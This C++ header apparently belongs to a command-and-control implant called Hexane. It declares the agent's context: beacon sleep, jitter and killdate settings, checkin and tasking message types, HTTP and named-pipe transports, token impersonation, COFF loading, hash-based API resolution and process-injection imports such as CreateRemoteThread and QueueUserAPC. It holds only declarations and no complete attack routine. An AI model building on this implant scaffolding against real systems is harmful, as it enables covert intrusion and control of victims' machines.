#ifndef HEXANE_MONOLITH_HPP
#define HEXANE_MONOLITH_HPP
#include <core/ntimports.hpp>

EXTERN_C LPVOID InstStart();
EXTERN_C LPVOID InstEnd();

#define WIN_VERSION_UNKNOWN                     0
#define WIN_VERSION_XP                          1
#define WIN_VERSION_VISTA                       2
#define WIN_VERSION_2008                        3
#define WIN_VERSION_7                           4
#define WIN_VERSION_2008_R2                     5
#define WIN_VERSION_2012                        7
#define WIN_VERSION_8                           8
#define WIN_VERSION_8_1                         8.1
#define WIN_VERSION_2012_R2                     9
#define WIN_VERSION_10                          10
#define WIN_VERSION_2016_X                      11

#define MAX_PATH 								260
#define PIPE_BUFFER_MAX     					(64 * 1000 - 1)
#define MIN(a,b)								(a < b ? a : b)

#define C_CAST(T,x)								const_cast<T>(x)
#define D_CAST(T,x)								dynamic_cast<T>(x)
#define S_CAST(T,x)								static_cast<T>(x)
#define R_CAST(T,x)								reinterpret_cast<T>(x)

#define B_PTR(x)								(R_CAST(PBYTE, x))
#define C_PTR(x)                                (R_CAST(LPVOID, x))
#define U_PTR(x)                                (R_CAST(UINT_PTR, x))
#define C_DREF(x)                               (*R_CAST(VOID**, x))

#define U8_PTR(x) 								(S_CAST(uint8_t*, x))

#define FUNCTION								_text(B)
#define _prototype(x)                           decltype(x) *x
#define _code_seg(x)							__attribute__((used, section(x)))
#define _text(x) 								__attribute__((used, section(".text$" #x "")))
#define WEAK									__attribute__((weak))
#define DLL_EXPORT 								__declspec(dllexport)

#define ntstatus 								Ctx->Teb->LastErrorValue
#define PS_ATTR_LIST_SIZE(n)					(sizeof(PS_ATTRIBUTE_LIST) + (sizeof(PS_ATTRIBUTE) * (n - 1)))
#define MODULE_NAME(mod)						(mod->BaseDllName.Buffer)

#define PEB_POINTER64							(R_CAST(PPEB, __readgsqword(0x60)))
#define PEB_POINTER32							(R_CAST(PPEB, __readfsdword(0x30)))
#define REG_PEB32(ctx) 						    (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Ebx) + 0x8))
#define REG_PEB64(ctx) 						    (R_CAST(LPVOID, R_CAST(ULONG_PTR, ctx.Rdx) + 0x10))

#define P_IMAGE_DOS_HEADER(base)                (R_CAST(PIMAGE_DOS_HEADER, base))
#define P_IMAGE_NT_HEADERS(base, dos)			(R_CAST(PIMAGE_NT_HEADERS, B_PTR(base) + dos->e_lfanew))
#define P_IMAGE_EXPORT_DIRECTORY(dos, nt)	    (R_CAST(PIMAGE_EXPORT_DIRECTORY, (U_PTR(dos) + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)))
#define P_IMAGE_SECTION_HEADER(data, i)   		(R_CAST(PIMAGE_SECTION_HEADER, U_PTR(data) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * i)))

#define RVA(Ty, base, rva)  					(R_CAST(Ty, U_PTR(base) + rva))
#define NtCurrentProcess()              		(R_CAST(HANDLE, S_CAST(LONG_PTR, -1)))
#define NtCurrentThread()               		(R_CAST(HANDLE, S_CAST(LONG_PTR, -2)))

#define ARRAY_LEN(ptr) 							sizeof(ptr) / sizeof(ptr[0])
#define DYN_ARRAY_LEN(i, ptr) 					while (TRUE) { if (!ptr[i]) { break; } else { i++; }}
#define DYN_ARRAY_EXPR(i, ptr, x)				while (TRUE) { if (!ptr[i]) { break; } else { {x} i++; }}
#define PAGE_ALIGN(x)  							(B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))


#ifdef _M_X64
#define ENTRYPOINT_REG 							Rcx
#define PTR_MASK                                0x7FFFFFFF
#define PEB_POINTER     						PEB_POINTER64
#define REG_PEB_OFFSET(x) 						REG_PEB64(x)
#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET64
#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR64_MAGIC
#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_AMD64
#elif _M_IX86
#define ENTRYPOINT_REG 							Eax
#define PTR_MASK                                0x7FFF
#define PEB_POINTER     						PEB_POINTER32
#define REG_PEB_OFFSET(x) 						REB_PEB32(x)
#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET32
#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386
#endif

#define HEAP_NO_COMMIT							0, 0, 0, 0, 0
#define DESKTOP_ENVIRONMENT_NULL				0, 0, 0, 0, 0, 0, 0
#define SMB_SID_SINGLE_WORLD_SUBAUTHORITY		SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0
#define SMB_RID_SINGLE_MANDATORY_LOW			SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
#define PROCESS_CREATE_ALL_ACCESS_SUSPEND		PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#define ACCESS_VEH 								(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD)

#define UNMANAGED_PROCESS   					0
#define MANAGED_PROCESS     					1
#define ERROR_EXIT								0x7FFFFFFF
#define DBG_FLAG_OFFSET64						0x000000BC
#define DBG_FLAG_OFFSET32						0x00000068
#define FLG_HEAP_ENABLE_TAIL_CHECK				0x00000020
#define FLG_HEAP_ENABLE_FREE_CHECK				0x00000040
#define FLG_HEAP_VALIDATE_PARAMETERS			0x40000000

#define MESSAGE_HEADER_SIZE 					(sizeof(uint32_t) * 3)
#define SEGMENT_HEADER_SIZE 					((sizeof(uint32_t) * 6) + sizeof(uint32_t))
#define HTTP_REQUEST_MAX 						0x300000

#define THREAD_CREATE_FLAGS_NONE                  	0x00000000
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED      	0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH    	0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER    	0x00000004
#define THREAD_CREATE_FLAGS_LOADER_WORKER         	0x00000010
#define THREAD_CREATE_FLAGS_SKIP_LOADER_INIT      	0x00000020
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE 	0x00000040

#define DEFAULT_SECTION_SIZE						0x1000
#define DEFAULT_BUFFLEN								0x0400

#ifdef TRANSPORT_PIPE
#define MESSAGE_MAX PIPE_BUFFER_MAX
#else
#define MESSAGE_MAX HTTP_REQUEST_MAX
#endif

typedef NTSTATUS(NTAPI* NtReadVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE processHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE processHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI* NtQueryVirtualMemory_t)(HANDLE processHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE processHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
typedef NTSTATUS(NTAPI* NtCreateSection_t)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE SectionHandle, HANDLE processHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t) (HANDLE processHandle, PVOID BaseAddress);
typedef HRESULT(NTAPI* CLRCreateInstance_t)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

typedef PVOID(NTAPI* RtlCreateHeap_t)(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
typedef PVOID(NTAPI* RtlAllocateHeap_t)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef PVOID(NTAPI* RtlReAllocateHeap_t)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size);
typedef PVOID(NTAPI* RtlDestroyHeap_t)(PVOID HeapHandle);
typedef LOGICAL(NTAPI* RtlFreeHeap_t)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);

typedef NTSTATUS(NTAPI* NtOpenProcess_t)(PHANDLE hProcess, ACCESS_MASK dwDesiredAccess, POBJECT_ATTRIBUTES objectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* NtTerminateProcess_t)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
typedef NTSTATUS(NTAPI* NtOpenProcessToken_t)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* NtOpenThreadToken_t)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* NtDuplicateToken_t)(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE Type, PHANDLE NewTokenHandle);
typedef NTSTATUS(NTAPI* NtDuplicateObject_t)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);

typedef NTSTATUS(NTAPI* NtQueryInformationToken_t)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* NtCreateUserProcess_t)(PHANDLE processHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParams, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST ProcessAttributeList);
typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
typedef NTSTATUS(NTAPI* RtlCreateProcessParametersEx_t)(PRTL_USER_PROCESS_PARAMETERS* params, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* RtlDestroyProcessParameters_t)(PRTL_USER_PROCESS_PARAMETERS procParams);
typedef NTSTATUS (NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
typedef ULONG (NTAPI* RtlRandomEx_t)(PULONG Seed);

typedef NTSTATUS(NTAPI* NtGetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS(NTAPI* NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS(NTAPI* NtResumeThread_t)(HANDLE hThr, PULONG PrviousSuspendCount);
typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(HANDLE Handle, BOOLEAN Alertable, ULONG Timeout);
typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE hObject);
typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING Destinationstring, PCWSTR Sourcestring);
typedef NTSTATUS (NTAPI* NtTestAlert_t)(VOID);
typedef NTSTATUS (NTAPI* TpAllocWork_t)(PTP_WORK* ptpWork, PTP_WORK_CALLBACK callback, PVOID optArgs, PTP_CALLBACK_ENVIRON cbEnviron);
typedef VOID (NTAPI* TpPostWork_t)(PTP_WORK ptpWork);
typedef VOID (NTAPI* TpReleaseWork_t)(PTP_WORK ptpWork);


WEAK EXTERN_C uint32_t		__global;
#define GLOBAL_OFFSET       (U_PTR(InstStart()) + U_PTR(&__global))
#define HEXANE 		        _hexane* Ctx = R_CAST(_hexane*, C_DREF(GLOBAL_OFFSET));

#define InitializeObjectAttributes(ptr, name, attr, root, sec )	\
    (ptr)->Length = sizeof( OBJECT_ATTRIBUTES );				\
    (ptr)->RootDirectory = root;								\
    (ptr)->Attributes = attr;									\
    (ptr)->ObjectName = name;									\
    (ptr)->SecurityDescriptor = sec;							\
    (ptr)->SecurityQualityOfService = NULL


#define MmPatchData(iter, dst, d_iter, src, s_iter, n)	\
	for (int iter = 0; iter < n; iter++) {           	\
		(dst)[d_iter] = (src)[s_iter];					\
		__asm("");  									\
	}


#define ZeroFreePtr(x, n) 						\
	x_memset(x, 0, n); 							\
	Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, x);		\
	x = nullptr


#define F_PTR_HMOD(Fn, hmod, sym_hash) 	\
	Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash)


#define F_PTR_HASHES(Fn, mod_hash, sym_hash) \
	Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash)


#define M_PTR(mod_hash) \
	Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))


#define NT_ASSERT(Fn)	\
	Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return


#define return_defer(x)	\
	ntstatus = x; goto defer


enum MessageType {
	TypeCheckin     = 0x7FFFFFFF,
	TypeTasking     = 0x7FFFFFFE,
	TypeResponse    = 0x7FFFFFFD,
	TypeSegment     = 0x7FFFFFFC,
    TypeExecute     = 0x7FFFFFFB,
    TypeObject		= 0x7FFFFFFA,
};

struct _object_map {
	PBYTE 	data;
	SIZE_T 	size;
};

struct _symbol {
	union {
		CHAR    Name[8];
		UINT32  Value[2];
	} First;

	UINT32 Value;
	UINT16 SectionNumber;
	UINT16 Type;
	UINT8  StorageClass;
	UINT8  NumberOfAuxSymbols;
};

struct _reloc {
	UINT32 VirtualAddress;
	UINT32 SymbolTableIndex;
	UINT16 Type;
};

struct _executable {
	PBYTE					buffer;
	PIMAGE_DOS_HEADER		dos_head;
	PIMAGE_NT_HEADERS		nt_head;

	IMAGE_SECTION_HEADER 	*section;
	IMAGE_EXPORT_DIRECTORY 	*exports;
	SIZE_T 					size;

	_reloc 					*reloc;
	_symbol 				*symbol;
	_object_map 			*fn_map;
	_object_map 			*sec_map;
	_executable 			*next;
};

typedef struct {
	PVOID  Buffer;
	UINT32 Length;
} BUFFER;

struct _mbs_buffer {
	LPSTR 	Buffer;
	ULONG 	Length;
};

struct _wcs_buffer {
	LPWSTR 	Buffer;
	ULONG 	Length;
};

struct _resource {
    LPVOID  ResLock;
    HGLOBAL hGlobal;
    SIZE_T  Size;
};

struct _http_context {
	LPWSTR  Useragent;
	LPWSTR  Method;
	LPWSTR	Address;
	INT 	Port;
	LPWSTR	ProxyAddress;
	LPWSTR	ProxyUsername;
	LPWSTR	ProxyPassword;
	LPCWSTR	Accept;
	ULONG	Access;
	ULONG 	Flags;
	HINTERNET	Handle;
	ULONG 	nEndpoints;
	LPWSTR	*Endpoints;
	LPWSTR	*Headers;
};

struct _token_list_data {
	HANDLE  Handle;
	LPWSTR  DomainUser;
	DWORD   dwProcessID;
	SHORT   Type;

	LPWSTR   lpUser;
	LPWSTR   lpPassword;
	LPWSTR   lpDomain;

	_token_list_data* Next;
};

struct _stream {
	ULONG   PeerId;
	ULONG   TaskId;
	ULONG   MsgType;
	ULONG	Length;
	LPVOID	Buffer;
	BOOL 	Ready;
	_stream  *Next;
};


struct _parser {
	LPVOID 	Handle;
    LPVOID  Buffer;
	ULONG 	Length;
	BOOL 	LE;
};


typedef struct {
	PSID					Sid;
	PSID					SidLow;
	PACL					pAcl;
	PSECURITY_DESCRIPTOR	SecDesc;
} SMB_PIPE_SEC_ATTR, *PSMB_PIPE_SEC_ATTR;


typedef void (*_command)(_parser *args);
struct _command_map{
	char    	*name;
	_command 	address;
};


struct LdrpVectorHandlerEntry {
    LdrpVectorHandlerEntry 		*Flink;
    LdrpVectorHandlerEntry 		*Blink;
    uint64_t 					Unknown1;
    uint64_t 					Unknown2;
    PVECTORED_EXCEPTION_HANDLER Handler;
};


struct LdrpVectorHandlerList {
    LdrpVectorHandlerEntry *First;
    LdrpVectorHandlerEntry *Last;
    SRWLOCK 				Lock;
};


struct _heap_info {
    ULONG_PTR HeapId;
    DWORD ProcessId;
};


struct _u32_block {
    uint32_t v0;
    uint32_t v1;
};


struct _ciphertext {
    uint32_t table[64];
};

struct _hexane{

	LPVOID 	Heap;
	PTEB 	Teb;
	BOOL 	Root;
    BOOL   	LE;

	struct {
		UINT_PTR    Address;
		ULONG	    Size;
	} Base;

	_executable *Coffs;

	struct {
		// todo : finish tokens
		_token_list_data *Vault;
		_token_list_data *Token;
		bool             Impersonate;
	} Tokens;

	struct {
		HMODULE ntdll;
		HMODULE kernel32;
		HMODULE crypt32;
		HMODULE winhttp;
		HMODULE advapi;
		HMODULE iphlpapi;
		HMODULE mscoree;
	} Modules;

	struct {
		PBYTE	Key;
		LPWSTR  IngressPipename;
		LPWSTR  EgressPipename;
		HANDLE  EgressHandle;
		LPSTR	Hostname;
		ULONG	Sleeptime;
		ULONG	Jitter;
		ULONG 	WorkingHours;
		ULONG64	Killdate;
	} Config;

	struct {
		INT		Retry;
		BOOL	Checkin;
		ULONG	Ppid;
		ULONG	Pid;
		ULONG	Tid;
		WORD	Architecture;
		ULONG	OSVersion;
		ULONG	CurrentTaskId;
        ULONG	PeerId;
	} Session;

	struct {
		BOOL  	    	bSSL;
		BOOL	    	bProxy;
		BOOL	    	bEnvProxy;
		BOOL	    	bEnvProxyCheck;
		LPVOID	    	EnvProxy;
		SIZE_T	    	EnvProxyLen;
		LPSTR 			Domain;
		_http_context 	*http;
        _stream        	*OutboundQueue;
	} Transport;

	struct {
		NtFreeVirtualMemory_t NtFreeVirtualMemory;
		NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
		NtProtectVirtualMemory_t NtProtectVirtualMemory;
		NtReadVirtualMemory_t NtReadVirtualMemory;
		NtWriteVirtualMemory_t NtWriteVirtualMemory;
		NtQueryVirtualMemory_t NtQueryVirtualMemory;
		NtCreateSection_t NtCreateSection;
		NtMapViewOfSection_t NtMapViewOfSection;
		NtUnmapViewOfSection_t NtUnmapViewOfSection;

		NtOpenProcess_t NtOpenProcess;
		NtCreateUserProcess_t NtCreateUserProcess;
		NtTerminateProcess_t NtTerminateProcess;
		RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
		RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
		NtOpenProcessToken_t NtOpenProcessToken;
        NtOpenThreadToken_t NtOpenThreadToken;
		NtDuplicateToken_t NtDuplicateToken;
		NtDuplicateObject_t NtDuplicateObject;
		NtQueryInformationToken_t NtQueryInformationToken;
		NtQueryInformationProcess_t NtQueryInformationProcess;

		RtlCreateHeap_t RtlCreateHeap;
		RtlAllocateHeap_t RtlAllocateHeap;
		RtlReAllocateHeap_t RtlReAllocateHeap;
		RtlFreeHeap_t RtlFreeHeap;
		RtlDestroyHeap_t RtlDestroyHeap;
		RtlInitUnicodeString_t RtlInitUnicodeString;

		RtlRandomEx_t RtlRandomEx;
		NtResumeThread_t NtResumeThread;
		NtGetContextThread_t NtGetContextThread;
		NtSetContextThread_t NtSetContextThread;
		NtSetInformationThread_t NtSetInformationThread;
		NtWaitForSingleObject_t NtWaitForSingleObject;

		TpAllocWork_t TpAllocWork;
		TpPostWork_t TpPostWork;
		TpReleaseWork_t TpReleaseWork;
		NtTestAlert_t NtTestAlert;
		NtClose_t NtClose;

		RtlGetVersion_t RtlGetVersion;
		NtQuerySystemInformation_t NtQuerySystemInformation;
	} Nt;

	struct {
		CLRCreateInstance_t CLRCreateInstance;
	} CLR;

	struct {
		_prototype(LoadLibraryA);
		_prototype(FreeLibrary);
		_prototype(GetProcessHeap);
		_prototype(GetProcessHeaps);
		_prototype(GetProcAddress);
		_prototype(GetModuleHandleA);

		_prototype(IsWow64Process);
        _prototype(OpenProcess);
		_prototype(CreateToolhelp32Snapshot);
		_prototype(Process32First);
		_prototype(Process32Next);
        _prototype(Module32First);
        _prototype(Module32Next);
		_prototype(GetCurrentProcessId);
		_prototype(GetProcessId);
		_prototype(ImpersonateLoggedOnUser);
		_prototype(AdjustTokenPrivileges);

		_prototype(GlobalMemoryStatusEx);
		_prototype(GetComputerNameExA);
		_prototype(SetLastError);
		_prototype(GetLastError);

        _prototype(RegOpenKeyExA);
        _prototype(RegCreateKeyExA);
        _prototype(RegSetValueExA);
        _prototype(RegCloseKey);

		_prototype(ReadFile);
		_prototype(WriteFile);
		_prototype(CreateFileW);
		_prototype(GetFileSizeEx);
		_prototype(GetFullPathNameA);
		_prototype(FindFirstFileA);
		_prototype(FindClose);
		_prototype(FindNextFileA);
		_prototype(GetCurrentDirectoryA);
		_prototype(FileTimeToSystemTime);
		_prototype(SystemTimeToTzSpecificLocalTime);
		_prototype(GetLocalTime);
		_prototype(GetSystemTimeAsFileTime);

		_prototype(FormatMessageA);
		_prototype(CreateRemoteThread);
		_prototype(CreateThread);
		_prototype(QueueUserAPC);
		_prototype(GetThreadLocale);
		_prototype(SleepEx);

		_prototype(WinHttpOpen);
		_prototype(WinHttpConnect);
		_prototype(WinHttpOpenRequest);
		_prototype(WinHttpAddRequestHeaders);
		_prototype(WinHttpSetOption);
		_prototype(WinHttpGetProxyForUrl);
		_prototype(WinHttpGetIEProxyConfigForCurrentUser);
		_prototype(WinHttpSendRequest);
		_prototype(WinHttpReceiveResponse);
		_prototype(WinHttpReadData);
		_prototype(WinHttpQueryHeaders);
		_prototype(WinHttpQueryDataAvailable);
		_prototype(WinHttpCloseHandle);
		_prototype(GetAdaptersInfo);

		_prototype(CryptStringToBinaryA);
		_prototype(CryptBinaryToStringA);
		_prototype(FindResourceA);
		_prototype(LoadResource);
		_prototype(LockResource);
		_prototype(SizeofResource);
		_prototype(FreeResource);

		_prototype(CallNamedPipeW);
		_prototype(CreateNamedPipeW);
		_prototype(WaitNamedPipeW);
		_prototype(SetNamedPipeHandleState);
		_prototype(ConnectNamedPipe);
		_prototype(TransactNamedPipe);
		_prototype(DisconnectNamedPipe);
		_prototype(PeekNamedPipe);

		_prototype(GetUserNameA);
		_prototype(LookupAccountSidW);
		_prototype(LookupPrivilegeValueA);
		_prototype(SetEntriesInAclA);
		_prototype(AllocateAndInitializeSid);
		_prototype(AddMandatoryAce);
		_prototype(InitializeSecurityDescriptor);
		_prototype(SetSecurityDescriptorDacl);
		_prototype(SetSecurityDescriptorSacl);
		_prototype(InitializeAcl);
		_prototype(FreeSid);
	} win32;

};
#endif
